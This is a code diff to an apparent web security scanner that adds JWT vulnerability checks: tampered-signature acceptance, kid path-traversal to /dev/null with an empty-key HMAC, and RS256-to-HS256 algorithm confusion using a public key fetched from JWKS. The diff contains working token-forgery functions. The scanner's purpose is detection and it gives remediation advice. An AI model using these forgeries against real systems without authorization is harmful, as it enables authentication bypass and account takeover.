@@ -15,6 +15,7 @@ import base64
 import hashlib
 import hmac
 import json
+from urllib.parse import urljoin, urlsplit
 
 import httpx
 
@@ -74,11 +75,51 @@ def forge_alg_none(token: str, alg: str = "none") -> str:
 
 
 def forge_bad_signature(token: str) -> str:
-    """Return the token with its signature altered to a valid-shaped but wrong value."""
+    """Return the token with its signature altered to a valid-shaped but wrong value.
+
+    Flips the *first* signature character: base64url's leading char carries all six bits,
+    so this always changes the decoded first byte. (The trailing char can carry only a few
+    significant bits — e.g. for a 256-byte RSA signature — so flipping it may decode to the
+    same bytes and leave the signature still valid.)"""
     parts = token.split(".")
     sig = parts[2]
-    flipped = "B" if sig[-1] != "B" else "C"
-    return f"{parts[0]}.{parts[1]}.{sig[:-1]}{flipped}"
+    flipped = "B" if sig[0] != "B" else "C"
+    return f"{parts[0]}.{parts[1]}.{flipped}{sig[1:]}"
+
+
+# A bearer that is *not* a JWT at all — used to tell "the server ignores the signature"
+# (a JWT-shaped forgery is accepted) from "the endpoint just isn't authenticated".
+_GARBAGE_BEARER = "dastcore-not-a-jwt"
+
+# A kid that traverses to an empty/known file; if the server loads the signing key from it,
+# the key is empty, so an HMAC signed with an empty secret verifies.
+_KID_TRAVERSAL = "../../../../../../../../../../dev/null"
+
+
+def _header_of(token: str) -> dict:
+    try:
+        header = json.loads(_b64url_decode(token.split(".")[0]))
+        return header if isinstance(header, dict) else {}
+    except (ValueError, json.JSONDecodeError, IndexError):
+        return {}
+
+
+def _sign_with_header(header: dict, token: str, secret: bytes) -> str:
+    """Rebuild a token with a new header and an HMAC-SHA256 signature over it (given secret)."""
+    payload = token.split(".")[1]
+    head = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+    signature = _b64url_encode(hmac.new(secret, f"{head}.{payload}".encode(), hashlib.sha256).digest())
+    return f"{head}.{payload}.{signature}"
+
+
+def forge_kid_empty_key(token: str) -> str:
+    """Force HS256 with a traversal `kid` and sign with an empty key (the /dev/null trick)."""
+    return _sign_with_header({"alg": "HS256", "kid": _KID_TRAVERSAL, "typ": "JWT"}, token, b"")
+
+
+def forge_alg_confusion(token: str, public_key_pem: bytes) -> str:
+    """RS256→HS256 confusion: sign HS256 using the RSA *public* key (PEM) as the HMAC secret."""
+    return _sign_with_header({"alg": "HS256", "typ": "JWT"}, token, public_key_pem)
 
 
 def _point(request: HttpRequest) -> InjectionPoint:
@@ -149,6 +190,194 @@ async def check_jwt_none_acceptance(client: HttpClient, target_url: str, token: 
                 )
             ]
     return []
+
+
+def _accepted(response: HttpResponse | None) -> bool:
+    return response is not None and response.status_code < 400
+
+
+async def _verifies_signatures(
+    client: HttpClient, target_url: str, token: str
+) -> tuple[HttpResponse, HttpResponse] | None:
+    """Return (original, bad-signature) responses when the server *does* verify signatures
+    (original authorized, a tampered signature rejected), else None. The precondition for the
+    kid/algorithm-confusion checks — otherwise a forgery being accepted proves nothing."""
+    original = await _send_bearer(client, target_url, token)
+    if original is None or original.status_code >= 400:
+        return None
+    bad = await _send_bearer(client, target_url, forge_bad_signature(token))
+    if bad is None or bad.status_code < 400:
+        return None  # a wrong signature is accepted → signature-not-verified handles this
+    return original, bad
+
+
+def _jwt_finding(rule_id: str, name: str, severity: str, target_url: str, data: str, response: HttpResponse) -> Finding:
+    request = HttpRequest(method="GET", url=target_url, headers={"Authorization": "Bearer <forged JWT>"})
+    return Finding(
+        id=f"{rule_id}:GET:{target_url}",
+        rule_id=rule_id,
+        name=name,
+        severity=severity,  # type: ignore[arg-type]
+        cwe="CWE-347",
+        owasp="API2:2023-Broken Authentication",
+        family="jwt",
+        injection_point=_point(request),
+        evidence=[Evidence(type="differential", data=data[:200], confidence="high")],
+        request=request,
+        response=response,
+        remediation=(
+            "Verifica la firma del JWT con una allow-list fija de algoritmos server-side y una clave "
+            "de alta entropía; ignora los campos `alg`/`kid`/`jku` del token para elegir clave o "
+            "algoritmo, y rechaza cualquier token cuya firma no valide. Rota las claves comprometidas."
+        ),
+    )
+
+
+async def check_jwt_signature_not_verified(client: HttpClient, target_url: str, token: str) -> list[Finding]:
+    """Report a server that parses a JWT but never verifies its signature (so any claim —
+    role, scope, sub — can be tampered). Confirmed differentially: a JWT with a *wrong*
+    signature is accepted, while a non-JWT garbage bearer is rejected (ruling out a simply
+    unauthenticated endpoint)."""
+    if not looks_like_jwt(token):
+        return []
+    if not _accepted(await _send_bearer(client, target_url, token)):
+        return []
+    if _accepted(await _send_bearer(client, target_url, _GARBAGE_BEARER)):
+        return []  # a non-JWT bearer is accepted → the endpoint just isn't authenticated
+    bad = await _send_bearer(client, target_url, forge_bad_signature(token))
+    if not _accepted(bad):
+        return []  # a wrong signature is rejected → it does verify
+    return [
+        _jwt_finding(
+            "jwt-signature-not-verified",
+            "JWT signature not verified (claims can be tampered)",
+            "high",
+            target_url,
+            f"a JWT with a tampered signature was accepted ({bad.status_code}) while a non-JWT bearer was "
+            "rejected — the server reads the claims without verifying the signature",
+            bad,
+        )
+    ]
+
+
+async def check_jwt_kid_injection(client: HttpClient, target_url: str, token: str) -> list[Finding]:
+    """Report `kid` header injection: a traversal `kid` pointing at an empty file (/dev/null)
+    with an empty-key HMAC signature is accepted while a tampered signature is rejected — the
+    server loads the signing key from an attacker-controlled path."""
+    if not looks_like_jwt(token):
+        return []
+    control = await _verifies_signatures(client, target_url, token)
+    if control is None:
+        return []
+    _, bad = control
+    forged = await _send_bearer(client, target_url, forge_kid_empty_key(token))
+    if not _accepted(forged):
+        return []
+    return [
+        _jwt_finding(
+            "jwt-kid-injection",
+            "JWT kid header injection (attacker-controlled signing key)",
+            "high",
+            target_url,
+            f"a token with a path-traversal kid and an empty-key HMAC signature was accepted "
+            f"({forged.status_code}) while a tampered signature was rejected ({bad.status_code})",
+            forged,
+        )
+    ]
+
+
+def _jwk_to_pem(jwk: dict) -> bytes | None:
+    """Reconstruct an RSA public key PEM from a JWK (n, e). Needs `cryptography`; None if
+    unavailable or the JWK isn't a usable RSA key."""
+    try:
+        from cryptography.hazmat.primitives import serialization
+        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
+    except ImportError:
+        return None
+    if jwk.get("kty") != "RSA" or "n" not in jwk or "e" not in jwk:
+        return None
+    try:
+        n = int.from_bytes(_b64url_decode(jwk["n"]), "big")
+        e = int.from_bytes(_b64url_decode(jwk["e"]), "big")
+        public_key = RSAPublicNumbers(e, n).public_key()
+        return public_key.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
+    except (ValueError, TypeError):
+        return None
+
+
+def _rsa_jwk_from_jwks(text: str, kid: str | None) -> dict | None:
+    try:
+        data = json.loads(text)
+    except (ValueError, json.JSONDecodeError):
+        return None
+    keys = data.get("keys") if isinstance(data, dict) else None
+    if not isinstance(keys, list):
+        return None
+    rsa_keys = [k for k in keys if isinstance(k, dict) and k.get("kty") == "RSA"]
+    if kid is not None:
+        for key in rsa_keys:
+            if key.get("kid") == kid:
+                return key
+    return rsa_keys[0] if rsa_keys else None
+
+
+async def _discover_public_key_pem(client: HttpClient, target_url: str, token: str) -> bytes | None:
+    """Find the server's RSA public key from standard JWKS locations (and the token's own
+    `jku`), reconstructed to PEM — the material for an RS256→HS256 confusion forgery."""
+    header = _header_of(token)
+    kid = header.get("kid")
+    parts = urlsplit(target_url)
+    origin = f"{parts.scheme}://{parts.netloc}/"
+    candidates: list[str] = []
+    if isinstance(header.get("jku"), str):
+        candidates.append(header["jku"])  # client enforces scope on the fetch
+    candidates += [urljoin(origin, p) for p in (".well-known/jwks.json", "jwks.json")]
+
+    for url in candidates:
+        try:
+            response = await client.get(url)
+        except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
+            continue
+        if response.status_code != 200:
+            continue
+        jwk = _rsa_jwk_from_jwks(response.text, kid)
+        if jwk is not None:
+            pem = _jwk_to_pem(jwk)
+            if pem is not None:
+                return pem
+    return None
+
+
+async def check_jwt_algorithm_confusion(client: HttpClient, target_url: str, token: str) -> list[Finding]:
+    """RS256→HS256 algorithm confusion: if the token is RS*, fetch the server's RSA public
+    key (JWKS) and forge an HS256 token signed with that public key as the HMAC secret. A
+    naive verifier that trusts the token's `alg` and reuses one key for both will accept it.
+    Gated by the same bad-signature control so it can't fire on a non-verifying endpoint."""
+    if not looks_like_jwt(token):
+        return []
+    if not str(_header_of(token).get("alg", "")).upper().startswith("RS"):
+        return []  # only asymmetric RS* tokens are confusable into HS*
+    control = await _verifies_signatures(client, target_url, token)
+    if control is None:
+        return []
+    _, bad = control
+    public_key_pem = await _discover_public_key_pem(client, target_url, token)
+    if public_key_pem is None:
+        return []  # no public key discoverable (or `cryptography` not installed) — can't forge
+    forged = await _send_bearer(client, target_url, forge_alg_confusion(token, public_key_pem))
+    if not _accepted(forged):
+        return []
+    return [
+        _jwt_finding(
+            "jwt-alg-confusion",
+            "JWT algorithm confusion (RS256 → HS256 with the public key)",
+            "critical",
+            target_url,
+            f"an HS256 token signed with the RSA public key was accepted ({forged.status_code}) while a "
+            f"tampered signature was rejected ({bad.status_code}) — the verifier trusts the token's alg",
+            forged,
+        )
+    ]
 
 
 async def check_jwt_weak_secret(client: HttpClient, target_url: str, token: str) -> list[Finding]:
